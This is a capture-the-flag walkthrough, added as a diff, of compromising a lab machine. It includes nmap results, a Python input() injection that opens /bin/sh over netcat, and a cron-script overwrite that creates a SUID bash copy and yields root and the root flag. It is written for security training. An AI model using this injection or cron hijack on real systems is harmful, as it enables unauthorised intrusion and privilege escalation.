@@ -1,0 +1,104 @@
+IP: 10.10.191.115
+
+PORT      STATE SERVICE           VERSION
+22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 (RSA)
+|   256 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 (ECDSA)
+|_  256 e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d (ED25519)
+10000/tcp open  snet-sensor-mgmt?
+| fingerprint-strings:
+|   GenericLines:
+|     Private 0days
+|     Please enther number of exploits to send??: Traceback (most recent call last):
+|     File "./exploit.py", line 6, in <module>
+|     num_exploits = int(input(' Please enther number of exploits to send??: '))
+|     File "<string>", line 0
+|     SyntaxError: unexpected EOF while parsing
+|   GetRequest:
+|     Private 0days
+|     Please enther number of exploits to send??: Traceback (most recent call last):
+|     File "./exploit.py", line 6, in <module>
+|     num_exploits = int(input(' Please enther number of exploits to send??: '))
+|     File "<string>", line 1, in <module>
+|     NameError: name 'GET' is not defined
+|   HTTPOptions, RTSPRequest:
+|     Private 0days
+|     Please enther number of exploits to send??: Traceback (most recent call last):
+|     File "./exploit.py", line 6, in <module>
+|     num_exploits = int(input(' Please enther number of exploits to send??: '))
+|     File "<string>", line 1, in <module>
+|     NameError: name 'OPTIONS' is not defined
+|   NULL:
+|     Private 0days
+|_    Please enther number of exploits to send??:
+1 service unrecognized despite returning data. If you
+
+
+root@LAPTOP-U5913CMD:/home/akshay# nc 10.10.191.115 10000
+
+        Private 0days
+
+ Please enther number of exploits to send??: __import__('os').system('/bin/sh')
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1000(king) gid=1000(king) groups=1000(king),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
+
+
+I got this nice explanation about exploiting python using libraries.
+
+As you can see we were able to get a shell by exploiting it.
+
+
+king@ubuntu:~$ cat /etc/crontab
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *    * * *   king    cd /home/king/ && bash run.sh
+*  *    * * *   root    cd /home/king/ && bash root.sh
+*  *    * * *   root    cd /root/company && bash run.sh
+#
+
+Delete the root.sh and make a new file containg malicious code.
+
+Malicious code:
+
+cp /bin/bash /tmp/bash; chmod +s /tmp/bash
+
+
+king@ubuntu:~$ rm root.sh
+rm root.sh
+rm: remove write-protected regular file 'root.sh'? y
+y
+king@ubuntu:~$ echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > root.sh
+echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > root.sh
+king@ubuntu:~$ chmod +x root.sh
+chmod +x root.sh
+king@ubuntu:~$ cd /tmp
+cd /tmp
+
+king@ubuntu:/tmp$ ls -la bash
+ls -la bash
+-rwsr-sr-x 1 root root 1037528 Nov  7 07:09 bash
+king@ubuntu:/tmp$ ./bash -p
+./bash -p
+bash-4.3# id
+id
+uid=1000(king) gid=1000(king) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(king)
+bash-4.3# cd /root
+cd /root
+bash-4.3# cat root.txt
+cat root.txt
+9c37646777a5391################
